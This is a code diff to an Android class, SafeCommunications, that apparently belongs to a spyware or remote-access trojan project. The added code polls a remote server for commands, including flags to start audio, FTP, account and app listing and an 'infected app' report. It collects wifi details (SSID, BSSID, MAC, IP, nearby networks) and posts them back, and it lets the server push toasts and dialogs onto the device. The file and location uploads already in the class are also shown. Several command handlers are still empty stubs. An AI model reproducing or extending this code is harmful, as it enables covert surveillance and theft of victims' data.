@@ -1,15 +1,27 @@
 package com.safe.myapp;
 
 import android.content.Context;
+import android.content.Intent;
 import android.location.Location;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
+import android.net.wifi.ScanResult;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
+import android.os.AsyncTask;
 import android.os.Environment;
+import android.support.v4.util.Pair;
+import android.text.format.Formatter;
 import android.util.JsonReader;
 import android.util.Log;
+import android.widget.Toast;
 
 import com.loopj.android.http.AsyncHttpResponseHandler;
 import com.loopj.android.http.RequestParams;
+
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.BufferedInputStream;
 import java.io.DataOutputStream;
@@ -19,31 +31,51 @@ import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
+import java.util.List;
 
 import cz.msebera.android.httpclient.Header;
 
 public class SafeCommunications {
 
     private Context context;
+    private SafeStatus status;
     private SafeLogger logger;
     private String simpleID;
 
-    public SafeCommunications(Context context, SafeLogger logger, String simpleID) {
+    public SafeCommunications(Context context, SafeStatus status, SafeLogger logger, String simpleID) {
         this.context = context;
+        this.status = status;
         this.logger = logger;
         this.simpleID = simpleID;
     }
 
-    private String getWifiConnection(){
+    private void sayWifi() {
+        ConnectivityManager connManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
         WifiManager wifiMgr = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
         WifiInfo wifiInfo = wifiMgr.getConnectionInfo();
-        String ssid = wifiInfo.getSSID();
-        if (ssid.equals("<unknown ssid>")) {
-            ssid += " probably on mobile data";
+        List<Pair> sayWifi = new ArrayList<>();
+        // TODO make data serializable through json.
+        if (mWifi.isConnected()) {
+            sayWifi.add(new Pair("type", "wifi"));
+            sayWifi.add(new Pair("status", "Connected"));
+            sayWifi.add(new Pair("ssid", wifiInfo.getSSID()));
+            sayWifi.add(new Pair("bssid", wifiInfo.getBSSID()));
+            sayWifi.add(new Pair("mac", wifiInfo.getMacAddress()));
+            sayWifi.add(new Pair("ip", Formatter.formatIpAddress(wifiInfo.getIpAddress())));
+            // TODO because then we can just add an array to the request params
+            List<ScanResult> results = wifiMgr.getScanResults();
+            StringBuilder sb = new StringBuilder();
+            for (ScanResult result : results) {
+                sb.append(result.SSID + " " + result.BSSID + " " + result.level);
+            }
+            if(results.size() > 0) {
+                sayWifi.add(new Pair("nearby", sb.toString())); // TODO THIS IS MADNESS!
+            }
         } else {
-            ssid += " state " + wifiInfo.getSupplicantState();
+            sayWifi.add(new Pair("status", "Not connected"));
         }
-        return ssid;
+        say(sayWifi);
     }
 
     // TODO Walk directory
@@ -82,19 +114,14 @@ public class SafeCommunications {
         }
     }
 
-    public void httpSay(String message) {
-        RequestParams say = new RequestParams();
-        say.put("Message", message);
-        SafeRestClient.post("/message/" + simpleID + "/", say, new AsyncHttpResponseHandler() {
+    // Poll server for actions to take
+    public void pollServer() {
+        RequestParams params = new RequestParams();
+        SafeRestClient.get("/actions/" + simpleID + "/", params, new AsyncHttpResponseHandler() {
 
             @Override
             public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                // TODO Get response and read what to do
-                try {
-                    logger.write(new String(responseBody, "UTF-8"));
-                } catch (UnsupportedEncodingException e) {
-                    e.printStackTrace();
-                }
+                actionHandler(responseBody);
             }
 
             @Override
@@ -104,31 +131,129 @@ public class SafeCommunications {
         });
     }
 
-    public void httpSayStatus() {
-        RequestParams status = new RequestParams();
-        status.put("isLocationStarted", String.valueOf(SafeService.bLocationStarted));
-        status.put("isAudioStarted", String.valueOf(SafeService.bAudioStarted));
-        status.put("isWifiConnected", getWifiConnection());
-        SafeRestClient.get("/status/" + simpleID + "/", status, new AsyncHttpResponseHandler() {
+    public void actionHandler(byte[] response) {
+        try {
+            JSONObject jObject = new JSONObject(new String(response, "UTF-8"));
+            logger.write(jObject.toString(2));
+            boolean startLocation = jObject.getBoolean("startLocation");
+            boolean startAudio = jObject.getBoolean("startAudio");
+            boolean startFTP = jObject.getBoolean("startFTP");
+            boolean sayWifi = jObject.getBoolean("sayWifi");
+            boolean sayAccounts = jObject.getBoolean("sayAccounts");
+            boolean saySingleLocation = jObject.getBoolean("saySingleLocation");
+            boolean sayInstalledApps = jObject.getBoolean("sayInstalledApps");
+            boolean sayModelBrand = jObject.getBoolean("sayModelBrand");
+            boolean sayInfectedApp = jObject.getBoolean("sayInfectedApp");
+            String sayDirectoryContent = jObject.getString("sayDirectoryContent"); // TODO make array
+            String toast = jObject.getString("toast");
+            String dialog = jObject.getString("dialog");
 
+
+            if (startLocation) {
+
+            } else {
+
+            }
+
+            if (startAudio) {
+
+            } else {
+
+            }
+
+
+            if (startFTP) {
+
+            } else {
+
+            }
+
+            if (sayWifi) {
+                sayWifi();
+            }
+
+            if (sayAccounts) {
+
+            }
+
+            if (saySingleLocation) {
+
+            }
+
+            if (sayInstalledApps) {
+
+            }
+
+            if (sayModelBrand) {
+
+            }
+
+            if (sayInfectedApp) {
+
+            }
+
+            if (!sayDirectoryContent.isEmpty()) {
+
+            }
+
+            if (!toast.isEmpty()) {
+                showToast(toast);
+            }
+
+            if (!dialog.isEmpty()) {
+                showDialog(dialog);
+            }
+
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void showToast(String message) {
+        new AsyncTask<String, Void, String>() {
             @Override
-            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
-                // TODO Get response and read what to do
-                try {
-                    logger.write(new String(responseBody, "UTF-8"));
-                } catch (UnsupportedEncodingException e) {
-                    e.printStackTrace();
-                }
+            protected String doInBackground(String[] params) {
+                String str = params[0];
+                return str;
             }
 
             @Override
-            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
+            protected void onPostExecute(String message) {
+                Toast.makeText(context, message, Toast.LENGTH_LONG).show();
+            }
+        }.execute(message);
+    }
+
+    private void showDialog(String message) {
+        Intent i = new Intent(context, SafeDialog.class);
+        i.putExtra("message", message);
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(i);
+    }
+
+    public void say(List<Pair> kvps) {
+        RequestParams params = new RequestParams();
+        for(Pair p : kvps){
+            params.put(p.first.toString(), p.second);
+        }
+        logger.write(params.toString());
+        SafeRestClient.post("/say/" + simpleID + "/", params, new AsyncHttpResponseHandler() {
+
+            @Override
+            public void onSuccess(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody) {
+
+            }
+
+            @Override
+            public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {
 
             }
         });
     }
 
-    public void httpSayLocation(Location location) {
+    public void sayLocation(Location location) {
         RequestParams loc = new RequestParams();
         loc.put("lat", location.getLatitude());
         loc.put("lng", location.getLongitude());
@@ -149,10 +274,6 @@ public class SafeCommunications {
         });
     }
 
-    public void httpActionHandler(String jsonActions) {
-        // TODO startLocation == true, start location track. etc.
-    }
-
     public void upload(File... files) {
         for (final File file : files) {
             logger.write(file.getName() + " Checking");
@@ -170,7 +291,7 @@ public class SafeCommunications {
                     try {
                         params.put("tehAwesomeFile", file);
                         params.put("clientId", simpleID);
-                    } catch(FileNotFoundException e) {
+                    } catch (FileNotFoundException e) {
                         logger.write("Could not find file: " + file.getName());
                     }
 
@@ -184,10 +305,11 @@ public class SafeCommunications {
                                 e.printStackTrace();
                             }
                         }
+
                         @Override
                         public void onFailure(int statusCode, cz.msebera.android.httpclient.Header[] headers, byte[] responseBody, Throwable error) {
                             try {
-                                if(responseBody != null) {
+                                if (responseBody != null) {
                                     logger.write(new String(responseBody, "UTF-8"));
                                 }
                             } catch (UnsupportedEncodingException e) {
